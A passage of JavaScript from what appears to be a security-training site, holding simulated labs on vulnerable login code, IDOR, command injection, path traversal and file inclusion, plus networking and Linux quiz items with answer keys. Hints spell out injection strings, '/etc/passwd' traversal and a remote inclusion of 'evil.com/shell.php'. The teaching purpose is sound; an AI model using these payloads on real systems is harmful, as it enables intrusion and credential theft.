        session.setAttribute("user", user);
        // Session ID not regenerated
        return true;
    }
    // No failed attempt logging
    return false;
}

// Password storage
public void register(String user, String pass) {
    String query = "INSERT INTO users VALUES('" 
        + user + "', '" + pass + "')";
    // Plaintext password storage!
    stmt.executeUpdate(query);
}</pre>
                            <div class="lab-field" style="margin-top:16px">
                                <label>List the vulnerabilities (one per line)</label>
                                <textarea class="lab-input" id="labAuthInput" rows="6" placeholder="1. SQL Injection in login query&#10;2. &#10;3. "></textarea>
                            </div>
                            <button class="btn btn-primary" id="labAuthSubmit">Check Answers</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labAuthResult"></div>
            </div>`;

        const keywords = ['sql injection', 'plaintext', 'plain text', 'no rate limit', 'rate limit', 'session', 'session fixation', 'not regenerat', 'no log', 'brute force', 'no hash', 'unhash', 'concatenat'];

        $('#labAuthSubmit').onclick = () => {
            const val = $('#labAuthInput').value.toLowerCase();
            const found = keywords.filter((k) => val.includes(k));
            const result = $('#labAuthResult');
            result.classList.remove('hidden');
            if (found.length >= 3) {
                result.className = 'lab-result success';
                result.innerHTML = `✅ <strong>Excellent!</strong> You identified ${found.length} vulnerabilities. Key issues: SQL Injection, plaintext passwords, no rate limiting, session fixation, no logging of failed attempts.`;
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = `❌ You found ${found.length} issue(s). Look for at least 3. Consider: input handling, password storage, session management, and missing security controls.`;
            }
        };
    }

    function labIDOR(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Access Another User's Data</h4>
                        <p>You are logged in as user ID 1001. Find a way to access the admin's profile (user ID 1000).</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> IDOR Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>API Endpoint</label><input class="lab-input" id="labIdorInput" value="/api/users/1001/profile"></div>
                            <button class="btn btn-primary" id="labIdorSubmit">Send Request</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labIdorResult"></div>
            </div>`;

        $('#labIdorSubmit').onclick = () => {
            const val = $('#labIdorInput').value;
            const result = $('#labIdorResult');
            result.classList.remove('hidden');
            if (val.includes('1000')) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You accessed the admin\'s profile by changing the user ID from 1001 to 1000. The API didn\'t verify that you are authorized to view this user\'s data.';
                submitLabResult(state.currentLesson, true);
            } else if (val.includes('1001')) {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ That\'s your own profile. Try changing the user ID to access someone else\'s data.';
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ User not found. The admin\'s ID is close to yours (1001). Try nearby numbers.';
            }
        };
    }

    function labCmdI(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Execute a System Command</h4>
                        <p>The ping tool executes <code>ping -c 4 [INPUT]</code>. Inject a command to read <code>/etc/hostname</code>.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Command Injection Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Hostname to Ping</label><input class="lab-input" id="labCmdiInput" placeholder="Enter hostname…"></div>
                            <div class="lab-query-preview"><span class="preview-label">Command Executed</span><div id="labCmdiPreview">ping -c 4 </div></div>
                            <button class="btn btn-primary" id="labCmdiSubmit">Execute</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labCmdiResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint</button>
                    <div class="hint-box hidden" id="labCmdiHint"></div>
                </div>
            </div>`;

        const input = $('#labCmdiInput');
        input.oninput = () => { $('#labCmdiPreview').textContent = `ping -c 4 ${input.value}`; };

        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labCmdiHint'); h.innerHTML = 'Use a command separator like <code>;</code> or <code>&&</code> to chain a second command. Try: <code>8.8.8.8; cat /etc/hostname</code>'; h.classList.remove('hidden'); }; });

        $('#labCmdiSubmit').onclick = () => {
            const val = input.value;
            const result = $('#labCmdiResult');
            result.classList.remove('hidden');
            const hasInjection = /[;|&]/.test(val) && (/cat|less|more|head|tail|type/.test(val) || /hostname|passwd|etc/.test(val));
            if (hasInjection) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You injected a command using a separator. The server executed both the ping AND your injected command.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> You need to use a command separator to chain an additional command after the ping.';
            }
        };
    }

    function labPath(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Read a Sensitive File</h4>
                        <p>The file viewer serves files from <code>/var/www/docs/</code>. Use path traversal to read <code>/etc/passwd</code>.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Path Traversal Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Filename</label><input class="lab-input" id="labPathInput" placeholder="Enter filename…"></div>
                            <div class="lab-query-preview"><span class="preview-label">Resolved Path</span><div id="labPathPreview">/var/www/docs/</div></div>
                            <button class="btn btn-primary" id="labPathSubmit">View File</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labPathResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint</button>
                    <div class="hint-box hidden" id="labPathHint"></div>
                </div>
            </div>`;

        const input = $('#labPathInput');
        input.oninput = () => { $('#labPathPreview').textContent = `/var/www/docs/${input.value}`; };
        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labPathHint'); h.innerHTML = 'Use <code>../</code> to go up directories. From <code>/var/www/docs/</code> you need to go up 3 levels to reach <code>/</code>, then navigate to <code>etc/passwd</code>.'; h.classList.remove('hidden'); }; });

        $('#labPathSubmit').onclick = () => {
            const val = input.value;
            const result = $('#labPathResult');
            result.classList.remove('hidden');
            if (val.includes('..') && val.includes('etc/passwd')) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You used directory traversal (<code>../</code>) to escape the document root and read /etc/passwd.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> You need to traverse up from /var/www/docs/ to reach /etc/passwd.';
            }
        };
    }

    function labMisconfig(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Fix Security Headers</h4>
                        <p>The server response is missing critical security headers. Add the correct headers and values.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Security Headers Lab</div>
                        <div class="terminal-body">
                            <p style="font-size:0.85rem;margin-bottom:12px">Add the missing security headers (header: value):</p>
                            <div class="lab-field"><label>1. Prevent clickjacking</label><input class="lab-input" id="labMisc1" placeholder="Header: value"></div>
                            <div class="lab-field"><label>2. Prevent MIME sniffing</label><input class="lab-input" id="labMisc2" placeholder="Header: value"></div>
                            <div class="lab-field"><label>3. Force HTTPS</label><input class="lab-input" id="labMisc3" placeholder="Header: value"></div>
                            <button class="btn btn-primary" id="labMiscSubmit">Verify Headers</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labMiscResult"></div>
            </div>`;

        $('#labMiscSubmit').onclick = () => {
            const v1 = $('#labMisc1').value.toLowerCase(), v2 = $('#labMisc2').value.toLowerCase(), v3 = $('#labMisc3').value.toLowerCase();
            const c1 = v1.includes('x-frame-options') && (v1.includes('deny') || v1.includes('sameorigin'));
            const c2 = v2.includes('x-content-type-options') && v2.includes('nosniff');
            const c3 = v3.includes('strict-transport-security') && v3.includes('max-age');
            const score = [c1, c2, c3].filter(Boolean).length;
            const result = $('#labMiscResult');
            result.classList.remove('hidden');
            if (score === 3) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>All correct!</strong> X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security are all properly configured.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = `❌ ${score}/3 correct. ${!c1 ? 'Clickjacking prevention: X-Frame-Options: DENY. ' : ''}${!c2 ? 'MIME sniffing: X-Content-Type-Options: nosniff. ' : ''}${!c3 ? 'HTTPS: Strict-Transport-Security: max-age=31536000.' : ''}`;
            }
        };
    }

    function labFileInclusion(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Exploit File Inclusion</h4>
                        <p>The page loader uses <code>include($_GET['page'])</code> without validation. Read the server's <code>/etc/passwd</code> file using Local File Inclusion, then attempt Remote File Inclusion.</p></div>
                    </div>
                    <div class="lab-rules">
                        <div class="rule"><span class="rule-icon">📋</span> The web root is at <code>/var/www/html/pages/</code></div>
                        <div class="rule"><span class="rule-icon">📋</span> PHP's <code>allow_url_include</code> is enabled (bad config!)</div>
                        <div class="rule"><span class="rule-icon">🏁</span> Success: Include a file outside the web root OR a remote file</div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> File Inclusion Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Page Parameter (?page=)</label><input class="lab-input" id="labFiInput" placeholder="Enter file path…"></div>
                            <div class="lab-query-preview"><span class="preview-label">include() Call</span><div id="labFiPreview">include('');</div></div>
                            <button class="btn btn-primary" id="labFiSubmit">Load Page</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labFiResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint 1 (LFI)</button>
                    <button class="btn-hint" data-hint="2">💡 Hint 2 (RFI)</button>
                    <div class="hint-box hidden" id="labFiHint"></div>
                </div>
            </div>`;

        const input = $('#labFiInput');
        input.oninput = () => { $('#labFiPreview').textContent = `include('${input.value}');`; };

        const hints = {
            '1': 'For LFI, use <code>../</code> to traverse directories. From <code>/var/www/html/pages/</code> you need to go up 4 levels to reach <code>/</code>. Try: <code>../../../../etc/passwd</code>',
            '2': 'For RFI, try including a URL: <code>https://evil.com/shell.php</code>. This works because <code>allow_url_include</code> is enabled.',
        };

        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labFiHint'); h.innerHTML = hints[b.dataset.hint]; h.classList.remove('hidden'); }; });

        $('#labFiSubmit').onclick = () => {
            const val = input.value;
            const result = $('#labFiResult');
            result.classList.remove('hidden');
            const hasLFI = val.includes('..') && (val.includes('etc/') || val.includes('var/') || val.includes('proc/'));
            const hasRFI = /^https?:\/\//i.test(val);
            if (hasLFI || hasRFI) {
                result.className = 'lab-result success';
                result.innerHTML = hasRFI
                    ? '✅ <strong>Success!</strong> You exploited Remote File Inclusion! The server fetched and executed code from an external source. In production, this would give you a web shell.'
                    : '✅ <strong>Success!</strong> You exploited Local File Inclusion! By traversing directories with <code>../</code>, you read files outside the web root.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> You need to either traverse directories (LFI) to read system files like <code>/etc/passwd</code>, or include a remote URL (RFI).';
            }
        };
    }



    /* ============================================================
       GENERIC LAB HELPER
       ============================================================ */
    function labGeneric(pane, title, question, answers, correctIdx) {
        var html = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">'+title+'</span></div><div class="lab-body"><p>'+question+'</p><div class="lab-options">';
        answers.forEach(function(a, i) {
            html += '<button class="lab-option" data-idx="'+i+'">'+a+'</button>';
        });
        html += '</div><div id="labFeedback" class="lab-feedback" style="display:none"></div></div></div>';
        pane.innerHTML = html;
        $$('.lab-option').forEach(function(btn) {
            btn.onclick = function() {
                $$('.lab-option').forEach(function(x){x.classList.remove('selected','correct','wrong');});
                var idx = +btn.dataset.idx;
                if (idx === correctIdx) {
                    btn.classList.add('correct');
                    $('#labFeedback').style.display = 'block';
                    $('#labFeedback').innerHTML = '<span style="color:var(--success)">Correct!</span>';
                    $('#labFeedback').className = 'lab-feedback lab-feedback-success';
                } else {
                    btn.classList.add('wrong');
                    $('#labFeedback').style.display = 'block';
                    $('#labFeedback').innerHTML = '<span style="color:var(--danger)">Incorrect. Try again!</span>';
                    $('#labFeedback').className = 'lab-feedback lab-feedback-error';
                }
            };
        });
    }

    /* C1 LABS */
    function labBoard(pane) {
        labGeneric(pane, 'Motherboard Form Factors',
            'Which motherboard form factor is the SMALLEST?',
            ['ATX', 'E-ATX', 'Micro-ATX', 'Mini-ITX'], 3);
    }

    function labCPU(pane) {
        labGeneric(pane, 'CPU Architecture',
            'What does the CPU do during a context switch?',
            ['Saves the current process state and loads the next process', 'Shuts down unused cores', 'Increases clock speed', 'Formats the L1 cache'], 0);
    }

    function labRAM(pane) {
        labGeneric(pane, 'Memory Types',
            'Which type of memory is VOLATILE (loses data when powered off)?',
            ['SSD', 'HDD', 'RAM', 'ROM'], 2);
    }

    function labBinary(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Binary Conversion Challenge</span></div><div class="lab-body"><p>Convert the binary number <code style="font-size:1.2rem">11001010</code> to decimal:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labBinIn" type="number" style="width:100px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.1rem;text-align:center" placeholder="?"><button class="demo-btn" id="labBinCheck">Check</button></div><div id="labBinFeedback" style="text-align:center;font-size:0.9rem"></div></div></div>';
        $('#labBinCheck').onclick = function() {
            var ans = +$('#labBinIn').value;
            if (ans === 202) $('#labBinFeedback').innerHTML = '<span style="color:var(--success)">Correct! 11001010 = 128+64+8+2 = 202</span>';
            else $('#labBinFeedback').innerHTML = '<span style="color:var(--danger)">Not quite. Hint: 128+64+0+0+8+0+2+0 = ?</span>';
        };
    }

    function labASCII(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">ASCII Decode Challenge</span></div><div class="lab-body"><p>Decode these ASCII values to reveal the word:</p><p style="font-family:var(--font-mono);font-size:1.2rem;text-align:center">72 65 76 76 79</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labAscIn" style="width:150px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.1rem;text-align:center" placeholder="?"><button class="demo-btn" id="labAscCheck">Check</button></div><div id="labAscFeedback" style="text-align:center"></div></div></div>';
        $('#labAscCheck').onclick = function() {
            var ans = $('#labAscIn').value.trim().toLowerCase();
            if (ans === 'hello') $('#labAscFeedback').innerHTML = '<span style="color:var(--success)">Correct! H(72) e(101) l(108) l(108) o(111) = Hello</span>';
            else $('#labAscFeedback').innerHTML = '<span style="color:var(--danger)">Not quite. Convert each number to its ASCII character.</span>';
        };
    }

    function labBase64(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Base64 Decode Challenge</span></div><div class="lab-body"><p>Decode this Base64 string to find the hidden message:</p><p style="font-family:var(--font-mono);font-size:1.1rem;text-align:center;background:var(--bg-secondary);padding:12px;border-radius:8px">U2VjdXJpdHlMYWI=</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labB64In" style="width:200px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);text-align:center" placeholder="Decoded text"><button class="demo-btn" id="labB64Check">Check</button></div><div id="labB64Feedback" style="text-align:center"></div></div></div>';
        $('#labB64Check').onclick = function() {
            var ans = $('#labB64In').value.trim();
            if (ans === 'SecurityLab') $('#labB64Feedback').innerHTML = '<span style="color:var(--success)">Correct! Base64 is encoding, NOT encryption.</span>';
            else $('#labB64Feedback').innerHTML = '<span style="color:var(--danger)">Try again. Use atob() in your browser console or a Base64 decoder.</span>';
        };
    }

    function labFileHeaders(pane) {
        labGeneric(pane, 'File Magic Numbers',
            'A file named "resume.pdf" has magic bytes: <code>4D 5A 90 00</code>. What is it really?',
            ['A valid PDF document', 'A JPEG image', 'A Windows executable (.exe)', 'A ZIP archive'], 2);
    }

    function labLogicGates(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Logic Gate Challenge</span></div><div class="lab-body"><p>Solve: What is the output of <code>(1 XOR 1) AND (0 OR 1)</code>?</p><div style="display:flex;gap:12px;justify-content:center;margin:16px 0"><button class="lab-option" data-v="0">0</button><button class="lab-option" data-v="1">1</button></div><div id="labGateFeedback" style="text-align:center"></div></div></div>';
        $$('.lab-option').forEach(function(b) {
            b.onclick = function() {
                $$('.lab-option').forEach(function(x){x.classList.remove('correct','wrong');});
                if (b.dataset.v === '0') { b.classList.add('correct'); $('#labGateFeedback').innerHTML = '<span style="color:var(--success)">Correct! (1 XOR 1) = 0, (0 OR 1) = 1, 0 AND 1 = 0</span>'; }
                else { b.classList.add('wrong'); $('#labGateFeedback').innerHTML = '<span style="color:var(--danger)">Incorrect. Work through each operation step by step.</span>'; }
            };
        });
    }

    function labXOR(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">XOR Decryption Challenge</span></div><div class="lab-body"><p>A message was XOR encrypted with key <code>0x42</code> (66 decimal). The ciphertext bytes are:</p><p style="font-family:var(--font-mono);text-align:center;background:var(--bg-secondary);padding:8px;border-radius:8px">0A 27 2D 2D 2E</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labXorIn" style="width:150px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);text-align:center" placeholder="Decrypted"><button class="demo-btn" id="labXorCheck">Check</button></div><div id="labXorFeedback" style="text-align:center"></div></div></div>';
        $('#labXorCheck').onclick = function() {
            var ans = $('#labXorIn').value.trim();
            if (ans.toLowerCase() === 'hello') $('#labXorFeedback').innerHTML = '<span style="color:var(--success)">Correct! XOR each byte with 0x42: 0A^42=48(H), 27^42=65(e)...</span>';
            else $('#labXorFeedback').innerHTML = '<span style="color:var(--danger)">XOR each ciphertext byte with the key 0x42 to get the plaintext.</span>';
        };
    }

    function labFS(pane) {
        labGeneric(pane, 'File Systems',
            'What is the maximum file size on a FAT32 filesystem?',
            ['2 GB', '4 GB', '16 TB', 'No limit'], 1);
    }

    function labCloud(pane) {
        labGeneric(pane, 'Cloud Service Models',
            'In which cloud model does the provider manage EVERYTHING including the application?',
            ['IaaS', 'PaaS', 'SaaS', 'On-Premises'], 2);
    }

    /* C2 LABS */
    function labOS(pane) {
        labGeneric(pane, 'Operating Systems',
            'Which component of the OS manages hardware access and runs in ring 0?',
            ['Shell', 'Desktop Environment', 'Kernel', 'Package Manager'], 2);
    }

    function labVM(pane) {
        labGeneric(pane, 'Virtualization',
            'Which hypervisor type runs directly on hardware without a host OS?',
            ['Type 1 (Bare-Metal)', 'Type 2 (Hosted)', 'Container Engine', 'Application VM'], 0);
    }

    /* C3 LABS */
    function labTerminal(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Terminal Command Challenge</span></div><div class="lab-body"><p>What command lists all files (including hidden ones) in long format?</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labTermIn" style="width:180px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)" placeholder="ls ..."><button class="demo-btn" id="labTermCheck">Check</button></div><div id="labTermFeedback" style="text-align:center"></div></div></div>';
        $('#labTermCheck').onclick = function() {
            var ans = $('#labTermIn').value.trim();
            if (ans === 'ls -la' || ans === 'ls -al' || ans === 'ls -lah' || ans === 'ls -alh') $('#labTermFeedback').innerHTML = '<span style="color:var(--success)">Correct! -l for long format, -a for all (hidden files).</span>';
            else $('#labTermFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Use ls with -l (long) and -a (all) flags.</span>';
        };
    }

    function labSudo(pane) {
        labGeneric(pane, 'sudo vs su',
            'What is the SECURITY advantage of sudo over su?',
            ['sudo is faster', 'sudo provides an audit trail and only runs one command as root', 'sudo does not require a password', 'su is deprecated'], 1);
    }

    function labFolders(pane) {
        labGeneric(pane, 'Linux Directories',
            'Which directory contains system configuration files like /etc/passwd?',
            ['/bin', '/home', '/etc', '/var'], 2);
    }

    function labPermissions(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">File Permissions Challenge</span></div><div class="lab-body"><p>A file has permissions: <code>-rw-r-----</code>. What is the numeric (octal) value?</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labPermIn" type="number" style="width:80px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.2rem;text-align:center" placeholder="???"><button class="demo-btn" id="labPermCheck">Check</button></div><div id="labPermFeedback" style="text-align:center"></div></div></div>';
        $('#labPermCheck').onclick = function() {
            var ans = +$('#labPermIn').value;
            if (ans === 640) $('#labPermFeedback').innerHTML = '<span style="color:var(--success)">Correct! rw- = 4+2+0 = 6, r-- = 4+0+0 = 4, --- = 0+0+0 = 0 = 640</span>';
            else $('#labPermFeedback').innerHTML = '<span style="color:var(--danger)">Hint: r=4, w=2, x=1. Calculate for owner(rw-), group(r--), others(---).</span>';
        };
    }

    function labEnv(pane) {
        labGeneric(pane, 'Environment Variables',
            'Why is storing secrets in environment variables risky?',
            ['They are encrypted', 'Any process can read them with env or /proc', 'They are deleted on logout', 'They only work in bash'], 1);
    }

    function labFileOps2(pane) {
        labGeneric(pane, 'File Operations',
            'What does <code>rm -rf /</code> do?',
            ['Removes read-only files', 'Recursively force-deletes EVERYTHING from root', 'Restores factory defaults', 'Removes recent files'], 1);
    }

    function labSearch2(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Search Command Challenge</span></div><div class="lab-body"><p>Write a command to find all files containing the word "password" in /var/www:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labSearchIn" style="width:280px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.85rem" placeholder="grep ..."><button class="demo-btn" id="labSearchCheck">Check</button></div><div id="labSearchFeedback" style="text-align:center"></div></div></div>';
        $('#labSearchCheck').onclick = function() {
            var ans = $('#labSearchIn').value.trim();
            if (ans.indexOf('grep') >= 0 && ans.indexOf('-r') >= 0 && ans.indexOf('password') >= 0) $('#labSearchFeedback').innerHTML = '<span style="color:var(--success)">Correct! grep -r recursively searches for patterns in files.</span>';
            else $('#labSearchFeedback').innerHTML = '<span style="color:var(--danger)">Hint: grep -r "password" /var/www</span>';
        };
    }

    function labProcess2(pane) {
        labGeneric(pane, 'Process Management',
            'How do you force-kill a process with PID 1234?',
            ['stop 1234', 'kill -9 1234', 'delete 1234', 'end 1234'], 1);
    }

    function labPipes2(pane) {
        labGeneric(pane, 'Pipes and Redirects',
            'What does <code>2>/dev/null</code> do?',
            ['Redirects stdout to null', 'Redirects stderr to null (suppresses errors)', 'Deletes /dev/null', 'Copies 2 bytes to null'], 1);
    }

    function labSSH2(pane) {
        labGeneric(pane, 'SSH Security',
            'Which SSH authentication method is MORE SECURE than passwords?',
            ['Telnet', 'Public key authentication', 'FTP login', 'HTTP Basic Auth'], 1);
    }

    /* C4 LABS */
    function labDorks(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Google Dork Challenge</span></div><div class="lab-body"><p>Write a Google dork to find PDF files on <code>target.com</code>:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labDorkIn" style="width:280px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.85rem" placeholder="site:..."><button class="demo-btn" id="labDorkCheck">Check</button></div><div id="labDorkFeedback" style="text-align:center"></div></div></div>';
        $('#labDorkCheck').onclick = function() {
            var ans = $('#labDorkIn').value.trim().toLowerCase();
            if (ans.indexOf('site:target.com') >= 0 && ans.indexOf('filetype:pdf') >= 0) $('#labDorkFeedback').innerHTML = '<span style="color:var(--success)">Correct! site: limits to domain, filetype: filters by extension.</span>';
            else $('#labDorkFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Combine site:target.com with filetype:pdf</span>';
        };
    }

    function labHTTP2(pane) {
        labGeneric(pane, 'HTTP Methods',
            'Which HTTP status code indicates the server crashed?',
            ['200 OK', '301 Redirect', '404 Not Found', '500 Internal Server Error'], 3);
    }

    function labCookies2(pane) {
        labGeneric(pane, 'Cookie Security',
            'Which cookie flag prevents JavaScript from reading the cookie?',
            ['Secure', 'SameSite', 'HttpOnly', 'Path'], 2);
    }

    /* C5 LABS */
    function labHardware2(pane) {
        labGeneric(pane, 'Network Hardware',
            'Which network device sends data only to the correct port using MAC addresses?',
            ['Hub', 'Switch', 'Repeater', 'Modem'], 1);
    }

    function labIP2(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">IP Address Classification</span></div><div class="lab-body"><p>Is the IP address <code>172.20.10.5</code> public or private?</p><div style="display:flex;gap:12px;justify-content:center;margin:16px 0"><button class="lab-option" data-v="pub">Public</button><button class="lab-option" data-v="priv">Private</button></div><div id="labIPFeedback" style="text-align:center"></div></div></div>';
        $$('.lab-option').forEach(function(b) {
            b.onclick = function() {
                $$('.lab-option').forEach(function(x){x.classList.remove('correct','wrong');});
                if (b.dataset.v === 'priv') { b.classList.add('correct'); $('#labIPFeedback').innerHTML = '<span style="color:var(--success)">Correct! 172.16.0.0 - 172.31.255.255 is private (Class B)</span>'; }
                else { b.classList.add('wrong'); $('#labIPFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Check if 172.20.x.x falls in the 172.16-31 private range.</span>'; }
            };
        });
    }

    function labTCPUDP2(pane) {
        labGeneric(pane, 'TCP vs UDP',
            'Which protocol is used for live video streaming and why?',
            ['TCP - reliability matters most', 'UDP - speed matters, occasional packet loss is acceptable', 'ICMP - it handles multimedia', 'HTTP - it supports video'], 1);
    }

    function labSubnet2(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Subnet Challenge</span></div><div class="lab-body"><p>How many usable host addresses are in a /28 subnet?</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labSubIn" type="number" style="width:80px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.2rem;text-align:center" placeholder="?"><button class="demo-btn" id="labSubCheck">Check</button></div><div id="labSubFeedback" style="text-align:center"></div></div></div>';
        $('#labSubCheck').onclick = function() {
            var ans = +$('#labSubIn').value;
            if (ans === 14) $('#labSubFeedback').innerHTML = '<span style="color:var(--success)">Correct! 2^(32-28) - 2 = 16 - 2 = 14 usable hosts</span>';
            else $('#labSubFeedback').innerHTML = '<span style="color:var(--danger)">Hint: 2^(32-CIDR) - 2 (subtract network and broadcast)</span>';
        };
    }

    function labSPF2(pane) {
        labGeneric(pane, 'Email Security',
            'What does SPF (Sender Policy Framework) prevent?',
            ['Spam emails', 'Email spoofing by checking sender IP', 'Phishing links in emails', 'Encrypted email interception'], 1);
    }

    function labDNS2(pane) {
        labGeneric(pane, 'DNS Records',
            'Which DNS record type maps a domain name to an IPv4 address?',
            ['MX', 'NS', 'A', 'CNAME'], 2);
    }

    function labOSI2(pane) {
        labGeneric(pane, 'OSI Model',
            'At which OSI layer does TCP operate?',
            ['Layer 2 - Data Link', 'Layer 3 - Network', 'Layer 4 - Transport', 'Layer 7 - Application'], 2);
    }

    function labDoS2(pane) {
        labGeneric(pane, 'DoS/DDoS Attacks',
            'What makes a DDoS attack different from a DoS attack?',
            ['DDoS uses encryption', 'DDoS originates from multiple sources (botnet)', 'DDoS is legal', 'DDoS only targets DNS'], 1);
    }

    /* C6 NEW LABS */
    function labSession(pane) {
        labGeneric(pane, 'Session Security',
            'Which session ID format is most resistant to brute-force attacks?',
            ['Sequential integers (1001, 1002, 1003)', 'Timestamp-based (20240101120000)', '128-bit cryptographic random token', 'Username-based (admin-session)'], 2);
    }

    function labClickjack(pane) {
        labGeneric(pane, 'Clickjacking Defense',
            'Which HTTP header prevents your page from being loaded in an iframe?',
            ['Content-Type', 'X-Frame-Options: DENY', 'Cache-Control', 'Accept-Encoding'], 1);
    }

    function labDirTraversal(pane) {
